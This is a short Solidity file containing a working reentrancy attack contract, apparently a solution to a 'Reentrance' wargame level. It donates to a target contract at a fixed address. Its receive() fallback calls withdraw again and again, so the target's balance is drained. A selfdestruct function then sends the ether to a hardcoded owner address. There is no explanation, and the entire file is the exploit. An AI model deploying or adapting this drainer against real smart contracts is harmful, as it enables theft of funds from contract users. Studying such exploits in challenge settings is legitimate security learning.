// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";
interface Reentrance{
    function donate(address) external payable;
    function withdraw(uint) external;
}
contract Reentrancy {
   address owner=0x49d214291B14373292A66c4dfa4d8E25A99f9a88;
   address  targetContract=0x123086Dc7703F3cF28A89b0a0Ba1DE2207fd6657;

   Reentrance reentrance=Reentrance(targetContract);

   function preAttack() public payable{
    reentrance.donate{value:1000000000000000}(address(this));
   }
   function endOfline()external{
    //selfdestruct deprecated so you can replace with call function to redeem yur ether...
    selfdestruct(payable(owner));
   }
   receive() external payable{
    reentrance.withdraw(1000000000000000);
   }
}
